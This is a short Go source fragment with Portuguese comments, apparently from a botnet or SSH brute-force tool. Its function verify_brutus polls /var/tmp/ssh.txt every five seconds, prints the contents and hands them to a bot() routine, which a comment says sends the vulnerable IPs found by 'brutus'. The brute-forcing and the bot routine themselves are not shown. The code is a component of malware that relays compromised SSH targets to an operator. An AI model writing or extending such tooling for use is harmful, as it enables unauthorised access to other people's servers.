package main



import (


"os"
"fmt"
"io/ioutil"
"time"



)


//verifica  os alvos  encontrados  pelo brutus



func verify_brutus() {
 


filename := "ssh.txt"


for {

 
time.Sleep(5 * time.Second) //evite to many error


ptr ,  err_op := os.Open("/var/tmp/" +  filename )


 if err_op != nil { continue }



out , err_rd :=  ioutil.ReadAll(ptr)


 if  err_rd != nil { return }


 
   out_str :=  string(out) 
   
   fmt.Println(out_str)


     bot(out_str)  //send ips  vuln  found by brutus
  



}


}



